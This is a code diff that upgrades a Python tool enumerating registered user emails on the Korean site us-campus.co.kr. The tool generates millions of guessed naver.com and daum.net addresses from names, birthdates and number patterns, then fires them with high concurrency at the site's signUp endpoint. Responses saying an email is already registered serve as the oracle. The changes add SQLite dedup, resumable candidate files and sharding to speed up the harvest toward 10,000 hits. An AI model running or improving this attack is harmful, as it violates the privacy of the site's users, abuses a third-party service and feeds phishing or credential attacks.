@@ -1,25 +1,32 @@
 #!/usr/bin/env python3
-"""us-campus 邮箱枚举 v2: 去重续跑 + naver精简字典 + 分片 + 高并发 signUp 预言机"""
+"""
+us-campus 邮箱枚举 v3 — 极致优化结合体
+- SQLite WAL 去重 (批量写入, 多进程安全)
+- 候选落盘 + 行号断点续跑 (重启不重建字典)
+- 热路径零文件锁 (仅批次结束 bulk flush)
+- 分片 + 高并发 signUp 预言机
+"""
 import argparse
 import fcntl
 import itertools
 import json
-import re
+import sqlite3
 import ssl
 import threading
 import time
 import urllib.error
 import urllib.parse
-from concurrent.futures import ThreadPoolExecutor, as_completed
-from datetime import date, datetime
+from concurrent.futures import ThreadPoolExecutor, wait, FIRST_COMPLETED
+from datetime import date
 from http.cookiejar import CookieJar
 from pathlib import Path
 from urllib.request import HTTPCookieProcessor, HTTPSHandler, Request, build_opener
 
 BASE = Path("/data/automation/results/us-campus.co.kr")
 STATE_DIR = BASE / "email_enum_state"
-GLOBAL_TESTED = STATE_DIR / "tested.txt"
+TESTED_DB = STATE_DIR / "tested.db"
 GLOBAL_HITS = STATE_DIR / "hits_all.jsonl"
+CAND_VERSION = 3
 
 ALL_SURNAMES = [
     "kim", "lee", "park", "choi", "jung", "jeong", "kang", "cho", "jo", "yoon", "yun", "jang", "lim", "im",
@@ -34,7 +41,7 @@ SHARD_GROUPS = [
     ["kim", "lee", "park", "choi"],
     ["jung", "jeong", "kang", "cho", "jo", "yoon", "yun"],
     ["jang", "lim", "im", "han", "oh", "seo", "shin", "kwon", "hwang"],
-    None,  # shard 3 = rest
+    None,
 ]
 
 GIVEN = [
@@ -56,32 +63,51 @@ COMMONS = [
 CTX = ssl.create_default_context()
 
 
-class FileSet:
-    def __init__(self, path: Path):
-        self.path = path
-        self.path.parent.mkdir(parents=True, exist_ok=True)
-        self._lock = threading.Lock()
-        self.data = set()
-        if self.path.exists():
-            for line in self.path.read_text(encoding="utf-8", errors="ignore").splitlines():
-                e = line.strip().lower()
-                if e:
-                    self.data.add(e)
+class TestedStore:
+    """SQLite WAL: O(1) 内存查重 + 批次 bulk 写入, 速度不随数据量衰减。"""
+
+    def __init__(self, db_path: Path):
+        self.db_path = db_path
+        self._local = threading.local()
+        self._mem = self._load_mem_set()
+
+    def _conn(self):
+        if not getattr(self._local, "conn", None):
+            c = sqlite3.connect(self.db_path, timeout=60, check_same_thread=False)
+            c.execute("PRAGMA journal_mode=WAL")
+            c.execute("PRAGMA synchronous=NORMAL")
+            c.execute("CREATE TABLE IF NOT EXISTS tested(email TEXT PRIMARY KEY)")
+            self._local.conn = c
+        return self._local.conn
+
+    def _load_mem_set(self):
+        if not self.db_path.exists():
+            return set()
+        conn = sqlite3.connect(self.db_path)
+        s = {row[0] for row in conn.execute("SELECT email FROM tested")}
+        conn.close()
+        return s
 
     def __contains__(self, item):
-        return item.lower() in self.data
+        return item.lower() in self._mem
 
-    def add(self, item: str):
-        e = item.lower()
-        with self._lock:
-            if e in self.data:
-                return False
-            self.data.add(e)
-            with open(self.path, "a", encoding="utf-8") as f:
-                fcntl.flock(f, fcntl.LOCK_EX)
-                f.write(e + "\n")
-                fcntl.flock(f, fcntl.LOCK_UN)
-            return True
+    def __len__(self):
+        return len(self._mem)
+
+    def bulk_add(self, emails):
+        if not emails:
+            return
+        new = []
+        for e in emails:
+            e = e.lower()
+            if e not in self._mem:
+                self._mem.add(e)
+                new.append((e,))
+        if not new:
+            return
+        conn = self._conn()
+        conn.executemany("INSERT OR IGNORE INTO tested VALUES(?)", new)
+        conn.commit()
 
 
 def shard_surnames(shard: int, shards: int):
@@ -95,16 +121,24 @@ def shard_surnames(shard: int, shards: int):
     return SHARD_GROUPS[shard]
 
 
-def build_slim_candidates(surnames, tested: FileSet, seen_hit: set):
-    cands = []
+def iter_slim_emails(surnames):
     years2 = [f"{y:02d}" for y in range(70, 100)] + [f"{y:02d}" for y in range(0, 10)]
     years4 = [str(y) for y in range(1975, 2006)]
     top = surnames[: min(25, len(surnames))]
+    seen = set()
 
-    # --- 高命中经典模式 (naver) ---
+    def emit(raw):
+        e = raw.lower()
+        if e in seen:
+            return
+        seen.add(e)
+        return e
+
     for s, g, yr in itertools.product(surnames, GIVEN, years2):
         for loc in (s + g + yr, g + s + yr):
-            cands.append(f"{loc}@naver.com")
+            e = emit(f"{loc}@naver.com")
+            if e:
+                yield e
 
     for s in top:
         for y in range(1975, 2008):
@@ -115,29 +149,42 @@ def build_slim_candidates(surnames, tested: FileSet, seen_hit: set):
                     except ValueError:
                         continue
                     bd = f"{y % 100:02d}{m:02d}{d:02d}"
-                    cands.append(f"{s}{bd}@naver.com")
+                    e = emit(f"{s}{bd}@naver.com")
+                    if e:
+                        yield e
 
     for s in surnames:
         for y in years2:
-            cands.append(f"{s}{y}@naver.com")
+            e = emit(f"{s}{y}@naver.com")
+            if e:
+                yield e
             for n in range(0, 100):
-                cands.append(f"{s}{y}{n:02d}@naver.com")
+                e = emit(f"{s}{y}{n:02d}@naver.com")
+                if e:
+                    yield e
         for n in range(1000, 10000):
-            cands.append(f"{s}{n}@naver.com")
+            e = emit(f"{s}{n}@naver.com")
+            if e:
+                yield e
 
     for s, g in itertools.product(surnames, GIVEN[:40]):
         for loc in (s + g, g + s, s + g + "1", s + g + "12"):
-            cands.append(f"{loc}@naver.com")
+            e = emit(f"{loc}@naver.com")
+            if e:
+                yield e
 
-    # --- phase2: 旧版未覆盖的新模式 ---
     phase2_s = surnames[: min(8, len(surnames))]
     for s, g in itertools.product(phase2_s, GIVEN[:30]):
         for y4 in years4:
-            cands.append(f"{s}{g}{y4}@naver.com")
-            cands.append(f"{g}{s}{y4}@naver.com")
+            for raw in (f"{s}{g}{y4}@naver.com", f"{g}{s}{y4}@naver.com"):
+                e = emit(raw)
+                if e:
+                    yield e
         for y in years2:
-            cands.append(f"{s}{g}{y}@daum.net")
-            cands.append(f"{g}{s}{y}@daum.net")
+            for raw in (f"{s}{g}{y}@daum.net", f"{g}{s}{y}@daum.net"):
+                e = emit(raw)
+                if e:
+                    yield e
 
     for s in top[:12]:
         for y in range(1975, 2008):
@@ -148,43 +195,70 @@ def build_slim_candidates(surnames, tested: FileSet, seen_hit: set):
                     except ValueError:
                         continue
                     bd = f"{y % 100:02d}{m:02d}{d:02d}"
-                    cands.append(f"{s}{bd}@daum.net")
+                    e = emit(f"{s}{bd}@daum.net")
+                    if e:
+                        yield e
 
     for c in COMMONS:
         for n in range(1000, 10000):
-            cands.append(f"{c}{n}@naver.com")
+            e = emit(f"{c}{n}@naver.com")
+            if e:
+                yield e
         for yr in years2:
             for n in range(100, 1000):
-                cands.append(f"{c}{yr}{n}@naver.com")
+                e = emit(f"{c}{yr}{n}@naver.com")
+                if e:
+                    yield e
 
-    seen = set()
-    out = []
-    for e in cands:
-        e = e.lower()
-        if e in seen or e in tested or e in seen_hit:
-            continue
-        seen.add(e)
-        out.append(e)
-    return out
+
+def ensure_candidate_file(shard_dir: Path, surnames, tested: TestedStore, seen_hit: set):
+    cand_file = shard_dir / "candidates.txt"
+    meta_file = shard_dir / "candidates.meta.json"
+    if cand_file.exists() and meta_file.exists():
+        try:
+            meta = json.loads(meta_file.read_text(encoding="utf-8"))
+            if meta.get("version") == CAND_VERSION and meta.get("count", 0) > 0:
+                return cand_file, meta["count"]
+        except Exception:
+            pass
+
+    print("building candidate file...", flush=True)
+    t0 = time.time()
+    count = 0
+    with open(cand_file, "w", encoding="utf-8") as f:
+        for e in iter_slim_emails(surnames):
+            if e in tested or e in seen_hit:
+                continue
+            f.write(e + "\n")
+            count += 1
+    meta_file.write_text(
+        json.dumps({"version": CAND_VERSION, "count": count, "built": time.time()}, indent=2),
+        encoding="utf-8",
+    )
+    print(f"candidates written {count} in {time.time()-t0:.1f}s", flush=True)
+    return cand_file, count
 
 
 def load_hits():
     hits = []
     seen = set()
-    sources = [GLOBAL_HITS] if GLOBAL_HITS.exists() else []
-    sources += sorted(BASE.glob("email_enum*/hits.jsonl"))
-    for p in sources:
+    paths = []
+    if GLOBAL_HITS.exists():
+        paths.append(GLOBAL_HITS)
+    paths += sorted(BASE.glob("email_enum*/hits.jsonl"))
+    for p in paths:
         if not p.exists():
             continue
-        for line in p.read_text(encoding="utf-8", errors="ignore").splitlines():
-            try:
-                r = json.loads(line)
-                em = (r.get("email") or "").lower()
-                if em and em not in seen:
-                    seen.add(em)
-                    hits.append(r)
-            except Exception:
-                pass
+        with open(p, encoding="utf-8", errors="ignore") as f:
+            for line in f:
+                try:
+                    r = json.loads(line)
+                    em = (r.get("email") or "").lower()
+                    if em and em not in seen:
+                        seen.add(em)
+                        hits.append(r)
+                except Exception:
+                    pass
     return hits, seen
 
 
@@ -198,68 +272,76 @@ def append_global_hit(rec: dict):
 
 def export_results(out_dir: Path, hits):
     out_dir.mkdir(parents=True, exist_ok=True)
-    (out_dir / "EMAIL_LINKS.md").write_text(
-        "# 注册邮箱\n\n" + "\n".join(f'{i}. [{r["email"]}](mailto:{r["email"]})' for i, r in enumerate(hits, 1)) + "\n",
-        encoding="utf-8",
-    )
-    with open(out_dir / "registered_emails.csv", "w", encoding="utf-8-sig") as f:
-        f.write("email,message\n")
-        for r in hits:
-            f.write(f"{r['email']},{(r.get('message') or '').replace(',', ' ')}\n")
     (out_dir / "registered_emails.json").write_text(json.dumps(hits, indent=2, ensure_ascii=False), encoding="utf-8")
+
+
+def read_batch(cand_file: Path, line_no: int, size: int):
+    batch = []
+    with open(cand_file, encoding="utf-8") as f:
+        for i, line in enumerate(f):
+            if i < line_no:
+                continue
+            e = line.strip().lower()
+            if e:
+                batch.append(e)
+            if len(batch) >= size:
+                return batch, i + 1
+    return batch, line_no + len(batch)
 
 
 def run_shard(args):
     STATE_DIR.mkdir(parents=True, exist_ok=True)
     shard_dir = STATE_DIR / f"shard_{args.shard}"
     shard_dir.mkdir(parents=True, exist_ok=True)
-
-    out_dir = BASE / f"email_enum_fast_s{args.shard}_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
+    out_dir = shard_dir / "run"
     out_dir.mkdir(parents=True, exist_ok=True)
+
     hits_path = out_dir / "hits.jsonl"
     prog_path = out_dir / "progress.txt"
     state_path = shard_dir / "state.json"
-    resume_path = shard_dir / "resume.idx"
-    tested_shard = FileSet(shard_dir / "tested_shard.txt")
-    tested_global = FileSet(GLOBAL_TESTED)
+    resume_path = shard_dir / "resume.line"
 
+    if not TESTED_DB.exists():
+        raise SystemExit(f"missing {TESTED_DB}, run usc-enum-bootstrap.py first")
+
+    tested_store = TestedStore(TESTED_DB)
     hits, seen_hit = load_hits()
     surnames = shard_surnames(args.shard, args.shards)
-    print(f"shard={args.shard}/{args.shards} surnames={len(surnames)} workers={args.workers}", flush=True)
-    print(f"seed_hits={len(hits)} global_tested={len(tested_global.data)}", flush=True)
+    print(f"shard={args.shard}/{args.shards} workers={args.workers} tested_db={len(tested_store)}", flush=True)
 
-    cands = build_slim_candidates(surnames, tested_global, seen_hit)
-    print(f"candidates={len(cands)} out={out_dir}", flush=True)
-    (out_dir / "candidates_count.txt").write_text(str(len(cands)))
-    (out_dir / "meta.json").write_text(
-        json.dumps({"shard": args.shard, "shards": args.shards, "surnames": surnames, "workers": args.workers}, indent=2),
-        encoding="utf-8",
-    )
+    cand_file, total_cands = ensure_candidate_file(shard_dir, surnames, tested_store, seen_hit)
+    print(f"candidates={total_cands} file={cand_file}", flush=True)
 
-    with open(hits_path, "w", encoding="utf-8") as f:
-        for r in hits:
-            f.write(json.dumps(r, ensure_ascii=False) + "\n")
-
-    start_idx = 0
+    line_no = 0
     if resume_path.exists():
         try:
-            start_idx = int(resume_path.read_text().strip())
+            line_no = int(resume_path.read_text().strip())
         except Exception:
-            start_idx = 0
-    if start_idx:
-        cands = cands[start_idx:]
-        print(f"resume from idx {start_idx} remain {len(cands)}", flush=True)
+            line_no = 0
+    elif (shard_dir / "resume.idx").exists():
+        try:
+            line_no = int((shard_dir / "resume.idx").read_text().strip())
+        except Exception:
+            line_no = 0
+    print(f"resume line={line_no} remain={max(0, total_cands - line_no)}", flush=True)
 
-    lock = threading.Lock()
-    tested = 0
-    errors = 0
-    retried_ok = 0
-    start = time.time()
+    if not hits_path.exists() or hits_path.stat().st_size == 0:
+        with open(hits_path, "w", encoding="utf-8") as f:
+            for r in hits:
+                f.write(json.dumps(r, ensure_ascii=False) + "\n")
+
+    stats = {"tested": 0, "errors": 0, "retried": 0}
+    stats_lock = threading.Lock()
+    hits_lock = threading.Lock()
     stop_flag = threading.Event()
     tls = threading.local()
+    start = time.time()
+    batch_size = args.batch_size
+    export_every = 10
+    batch_num = 0
 
     def get_op(force=False):
-        if force or getattr(tls, "op", None) is None or getattr(tls, "n", 0) >= 400:
+        if force or getattr(tls, "op", None) is None or getattr(tls, "n", 0) >= 500:
             tls.op = build_opener(HTTPCookieProcessor(CookieJar()), HTTPSHandler(context=CTX))
             tls.n = 0
             try:
@@ -300,94 +382,104 @@ def run_shard(args):
             return json.loads(e.read().decode("utf-8", "replace"))
 
     def check(em):
-        nonlocal tested, errors, retried_ok
         if stop_flag.is_set():
-            return
+            return None
         j = None
         for attempt in range(args.retries):
             if stop_flag.is_set():
-                return
+                return None
             op = get_op(force=(attempt > 0))
             try:
                 j = do_req(em, op)
                 if attempt > 0:
-                    with lock:
-                        retried_ok += 1
+                    with stats_lock:
+                        stats["retried"] += 1
                 break
             except Exception:
                 tls.op = None
-                time.sleep(0.05 * (attempt + 1))
-        with lock:
-            tested += 1
-            tested_shard.add(em)
-            tested_global.add(em)
-            if j is None:
-                errors += 1
-                return
-            msg = j.get("message") or ""
-            if "이미" in msg and "이메일" in msg:
+                time.sleep(0.03 * (attempt + 1))
+        if j is None:
+            with stats_lock:
+                stats["errors"] += 1
+            return em
+        msg = j.get("message") or ""
+        if "이미" in msg and "이메일" in msg:
+            with hits_lock:
                 if em not in seen_hit:
                     seen_hit.add(em)
                     rec = {"email": em, "message": msg, "ts": time.time(), "shard": args.shard}
                     hits.append(rec)
                     append_global_hit(rec)
-                    with open(hits_path, "a", encoding="utf-8") as f:
-                        f.write(json.dumps(rec, ensure_ascii=False) + "\n")
+                    with open(hits_path, "a", encoding="utf-8") as hf:
+                        hf.write(json.dumps(rec, ensure_ascii=False) + "\n")
                     print(f"HIT shard{args.shard} total={len(hits)} {em}", flush=True)
                     if len(hits) >= args.target:
                         stop_flag.set()
+        return em
 
-    batch = 3000
-    idx = 0
-    total = len(cands)
-    with ThreadPoolExecutor(max_workers=args.workers) as ex:
-        while idx < total and not stop_flag.is_set():
-            chunk = cands[idx : idx + batch]
-            idx += len(chunk)
-            futs = [ex.submit(check, em) for em in chunk]
-            for fut in as_completed(futs):
-                if stop_flag.is_set():
-                    break
-                try:
-                    fut.result()
-                except Exception:
-                    pass
-            cur_idx = start_idx + idx
-            resume_path.write_text(str(cur_idx), encoding="utf-8")
-            elapsed = time.time() - start
-            rps = tested / elapsed if elapsed else 0
-            line = (
-                f"shard={args.shard} progress idx={cur_idx} batch_tested={tested} "
-                f"hits={len(hits)} errors={errors} retried_ok={retried_ok} rps={rps:.1f} elapsed={elapsed:.0f}s"
-            )
-            print(line, flush=True)
-            prog_path.write_text(line + "\n", encoding="utf-8")
-            state_path.write_text(
-                json.dumps(
-                    {
-                        "shard": args.shard,
-                        "idx": cur_idx,
-                        "tested": tested,
-                        "hits": len(hits),
-                        "errors": errors,
-                        "rps": rps,
-                        "out": str(out_dir),
-                    },
-                    indent=2,
-                ),
-                encoding="utf-8",
-            )
+    while line_no < total_cands and not stop_flag.is_set():
+        batch_num += 1
+        chunk, next_line = read_batch(cand_file, line_no, batch_size)
+        if not chunk:
+            break
+
+        batch_tested = []
+        with ThreadPoolExecutor(max_workers=args.workers) as ex:
+            pending = {ex.submit(check, em): em for em in chunk}
+            while pending and not stop_flag.is_set():
+                done, _ = wait(pending, timeout=1, return_when=FIRST_COMPLETED)
+                for fut in done:
+                    pending.pop(fut, None)
+                    try:
+                        em = fut.result()
+                        if em:
+                            batch_tested.append(em)
+                    except Exception:
+                        pass
+
+        tested_store.bulk_add(batch_tested)
+        with stats_lock:
+            stats["tested"] += len(batch_tested)
+
+        line_no = next_line
+        resume_path.write_text(str(line_no), encoding="utf-8")
+
+        elapsed = time.time() - start
+        rps = stats["tested"] / elapsed if elapsed else 0
+        line = (
+            f"shard={args.shard} line={line_no}/{total_cands} tested={stats['tested']} "
+            f"hits={len(hits)} errors={stats['errors']} retried={stats['retried']} rps={rps:.1f} elapsed={elapsed:.0f}s"
+        )
+        print(line, flush=True)
+        prog_path.write_text(line + "\n", encoding="utf-8")
+        state_path.write_text(
+            json.dumps(
+                {
+                    "shard": args.shard,
+                    "line": line_no,
+                    "total": total_cands,
+                    "tested": stats["tested"],
+                    "hits": len(hits),
+                    "errors": stats["errors"],
+                    "rps": rps,
+                },
+                indent=2,
+            ),
+            encoding="utf-8",
+        )
+        if batch_num % export_every == 0:
             export_results(out_dir, hits)
 
     export_results(out_dir, hits)
-    print(f"FINISHED shard={args.shard} hits={len(hits)} tested={tested} errors={errors} out={out_dir}", flush=True)
+    print(f"DONE shard={args.shard} hits={len(hits)} tested={stats['tested']} errors={stats['errors']}", flush=True)
 
 
 def main():
-    ap = argparse.ArgumentParser(description="us-campus fast email enum")
+    ap = argparse.ArgumentParser(description="us-campus fast email enum v3")
     ap.add_argument("--shard", type=int, default=0)
     ap.add_argument("--shards", type=int, default=4)
-    ap.add_argument("--workers", type=int, default=150)
+    ap.add_argument("--workers", type=int, default=120)
+    ap.add_argument("--batch-size", type=int, default=8000)
     ap.add_argument("--target", type=int, default=10000)
     ap.add_argument("--retries", type=int, default=3)
     run_shard(ap.parse_args())
